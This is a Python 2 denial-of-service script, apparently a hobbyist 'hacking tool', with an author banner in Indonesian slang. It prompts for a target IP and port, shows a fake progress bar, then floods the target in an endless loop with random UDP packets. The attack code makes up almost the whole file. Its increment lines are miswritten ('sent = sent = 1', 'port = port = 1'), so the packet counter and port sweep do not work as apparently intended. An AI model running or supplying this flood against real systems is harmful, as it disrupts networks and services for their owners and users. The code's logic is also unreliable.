#rizkyyz tools hacking ddos attack
import sys
import os
import time
import socket
import random

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#####################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#####################

os.system("clear")
os.system("figlet Kang Down")
print
print  "Author     : rizkyyz / tn.angel"
print  "Youtube    : https://www.youtube.com/channel/UChSMz4axIFiSPW9z-vuvjxA"
print  "github     : https://github.com/rizkyyz"
print  "facebook   : https://www.facebook.com/Mrsky"
print  "Team       : no team "
print
ip = raw_input("MASUKIN IP TARGET LU : ")
port = input("MAUSKIN PORT        :")

os.system("clear")
os.system("figlet  Udah serang masss")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50% sabar yeah!!!"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent = 1
     port = port = 1
     print "Mengirim %s Packet ke %s target port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1